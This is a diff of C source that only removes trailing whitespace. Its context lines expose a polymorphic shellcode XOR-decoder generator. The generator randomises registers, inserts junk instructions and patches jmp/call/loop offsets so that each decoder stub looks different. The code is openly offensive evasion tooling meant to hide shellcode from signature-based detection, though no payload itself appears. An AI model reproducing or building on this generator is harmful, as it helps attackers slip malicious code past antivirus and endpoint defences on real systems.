@@ -11,7 +11,7 @@ typedef struct _POLYGEN_SHELLCODE
 {
 	DWORD   dwPosition;         // Position in shellcode                        - used for debugging purposes
     DWORD   dwVariant;          // Variant group ID
-    DWORD   dwLength;           // Actual instruction length 
+    DWORD   dwLength;           // Actual instruction length
     BYTE    InstructionSet[8];  // Max 8 bytes for longest instructions
     LPCSTR  Comment;            // Description                                  - used for debugging purposes
 
@@ -222,7 +222,7 @@ extern BOOL GenRandomByte(OUT PBYTE pRndValue);
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 
-BOOL FetchADummyAhhInstruction(OUT PBYTE* ppDummyInst, OUT PDWORD pdwDummyInstLength, IN DWORD dwPercentage) 
+BOOL FetchADummyAhhInstruction(OUT PBYTE* ppDummyInst, OUT PDWORD pdwDummyInstLength, IN DWORD dwPercentage)
 {
 	DWORD   dwSizeOfDummyInstructions       = sizeof(DummyInstructions) / sizeof(GARBAGE_INSTRUCTIONS),
             dwPercentageValue               = 0x00,
@@ -248,7 +248,7 @@ BOOL FetchADummyAhhInstruction(OUT PBYTE* ppDummyInst, OUT PDWORD pdwDummyInstLe
     if (!GenRandomByte((PBYTE)&dwRandomIndex))
         return FALSE;
 
-    dwRandomIndex = dwRandomIndex % dwSizeOfDummyInstructions;  
+    dwRandomIndex = dwRandomIndex % dwSizeOfDummyInstructions;
 
     if (!(pDummyInst = LocalAlloc(LPTR, DummyInstructions[dwRandomIndex].dwLength)))
     {
@@ -274,7 +274,7 @@ BOOL FetchADummyAhhInstruction(OUT PBYTE* ppDummyInst, OUT PDWORD pdwDummyInstLe
 	/*
     printf("[i] Inserted Dummy Instruction: %s\n", DummyInstructions[dwRandomIndex].Comment);
     */
-	
+
     *ppDummyInst        = pDummyInst;
     *pdwDummyInstLength = DummyInstructions[dwRandomIndex].dwLength;
     bResult             = TRUE;
@@ -295,7 +295,7 @@ _END_OF_FUNC:
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 
-BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDecoderLength, IN BYTE bXorKey) 
+BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDecoderLength, IN BYTE bXorKey)
 {
 
 	WORD        dw64BitRegisterVariant      = 0x00;
@@ -332,14 +332,14 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
             return FALSE;
 		}
 
-        dw64BitRegisterVariant  = (dw64BitRegisterVariant % 4);  
+        dw64BitRegisterVariant  = (dw64BitRegisterVariant % 4);
         dw8BitRegisterVariant   = (dw8BitRegisterVariant % 3);
     }
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-    
+
 	// 50% chance to add a dummy instruction
-    if (FetchADummyAhhInstruction(&pDummyInst, &dwDummyInstLength, 50)) 
+    if (FetchADummyAhhInstruction(&pDummyInst, &dwDummyInstLength, 50))
     {
         RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, pDummyInst, dwDummyInstLength);
         dwShellcodeLength += dwDummyInstLength;
@@ -355,10 +355,10 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-	// This is just a placeholder 
+	// This is just a placeholder
 	// Offset calculation is done later as we dont know the shellcode body length yet
 
-    // Save the current position for the jmp OFFSET instruction patching 
+    // Save the current position for the jmp OFFSET instruction patching
     dwJmpOffset = dwShellcodeLength;
 
     RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, JmpCalcOffset->InstructionSet, JmpCalcOffset->dwLength);
@@ -366,7 +366,7 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-	// Save the current position for the call OFFSET instruction patching 
+	// Save the current position for the call OFFSET instruction patching
     dwDecoderOffset = dwShellcodeLength;
 
     RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, PopPushAddr[dw64BitRegisterVariant].InstructionSet, PopPushAddr[dw64BitRegisterVariant].dwLength);
@@ -405,7 +405,7 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
     // Save the current position for the loop OFFSET instruction patching
-	dwLoopStartOffset = dwShellcodeLength; 
+	dwLoopStartOffset = dwShellcodeLength;
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
@@ -419,7 +419,7 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-    if (dw8BitRegisterVariant == 0x00) 
+    if (dw8BitRegisterVariant == 0x00)
 		AddXorKey[dw8BitRegisterVariant].InstructionSet[1] = bXorKey; // Set XOR key for AL
     else
 		AddXorKey[dw8BitRegisterVariant].InstructionSet[2] = bXorKey; // Set XOR key for DL or BL
@@ -435,7 +435,7 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-    switch (dw8BitRegisterVariant) 
+    switch (dw8BitRegisterVariant)
     {
         case 0: bRegField = 0; break;  // AL
         case 1: bRegField = 2; break;  // DL
@@ -443,7 +443,7 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
     }
 
     // Set the r/m field based on addr_variant
-    switch (dw64BitRegisterVariant) 
+    switch (dw64BitRegisterVariant)
     {
         case 0: bRmField = 0x06; break;  // [RSI]
         case 1: bRmField = 0x07; break;  // [RDI]
@@ -453,7 +453,7 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
 
     // mod=00 (no displacement), reg=bRegField, r/m=bRmField
     bModRmByte = (0u << 6) | (bRegField << 3) | bRmField;
-	XorCalcReg->InstructionSet[1] = bModRmByte;         
+	XorCalcReg->InstructionSet[1] = bModRmByte;
 
 	RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, XorCalcReg->InstructionSet, XorCalcReg->dwLength);
 	dwShellcodeLength += XorCalcReg->dwLength;
@@ -477,15 +477,15 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
 	dwShellcodeLength += IncAddrReg[dw64BitRegisterVariant].dwLength;
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-    
+
     iDisplacement8 = (int)dwLoopStartOffset - (int)(dwShellcodeLength + 2);
-    if (iDisplacement8 < -128 || iDisplacement8 > 127) 
+    if (iDisplacement8 < -128 || iDisplacement8 > 127)
     {
         printf("[!] Displacement Out Of Range For The LOOP Instruction: %d\n", iDisplacement8);
         return FALSE;
 	}
 
-	LoopCalcOffset->InstructionSet[1] = (BYTE)iDisplacement8; 
+	LoopCalcOffset->InstructionSet[1] = (BYTE)iDisplacement8;
 	RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, LoopCalcOffset->InstructionSet, LoopCalcOffset->dwLength);
 	dwShellcodeLength += LoopCalcOffset->dwLength;
 
@@ -533,7 +533,7 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
 
     iDisplacement8 = (INT)dwDecoderOffset - (INT)(dwGetAddressOffset + 5);
 
-	RtlCopyMemory(&CallOffset->InstructionSet[1], &iDisplacement8, sizeof(DWORD)); 
+	RtlCopyMemory(&CallOffset->InstructionSet[1], &iDisplacement8, sizeof(DWORD));
 
 	RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, CallOffset->InstructionSet, CallOffset->dwLength);
 	dwShellcodeLength += CallOffset->dwLength;
@@ -563,9 +563,9 @@ BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDe
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-   
+
 	*pdwTinyXorDecoderLength = dwShellcodeLength;
-    
+
     return TRUE;
 }
 
